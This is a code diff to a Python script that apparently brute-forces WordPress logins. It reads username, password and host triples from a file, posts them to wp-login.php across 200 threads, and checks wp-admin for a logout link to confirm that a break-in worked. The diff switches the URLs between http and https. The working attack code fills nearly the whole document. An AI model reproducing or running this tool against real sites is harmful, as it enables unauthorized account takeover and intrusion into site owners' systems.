@@ -16,7 +16,7 @@ headers = {
 
 source_file = "source.txt"
 #theard_count = int(input('Number of threads: '))
-theard_count = 200
+theard_count = 200 
 def brut(string):
     t = string.split()
     payload = {
@@ -24,10 +24,10 @@ def brut(string):
         'pwd':t[1],
         #'wp-submit': 'Log+In',
         #'rememberme': 'forever',
-        'redirect_to': 'https://'+t[2]+'/wp-admin',
+        'redirect_to': 'http://'+t[2]+'/wp-admin',
         'testcookie': '1'
     }
-    url = 'http://'+t[2]+'/wp-login.php'
+    url = 'https://'+t[2]+'/wp-login.php'
     s = requests.Session()
     try:    
         s.post(url, data=payload, headers=headers, timeout = 10)
@@ -38,7 +38,7 @@ def brut(string):
     '''if s.text.find('action=lostpassword')>0:action=logout
         return False
     else:'''
-    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
+    response = s.get('https://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
     #if response.status_code == 200:
     if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
     #if response.text.find('action=lostpassword')<0:
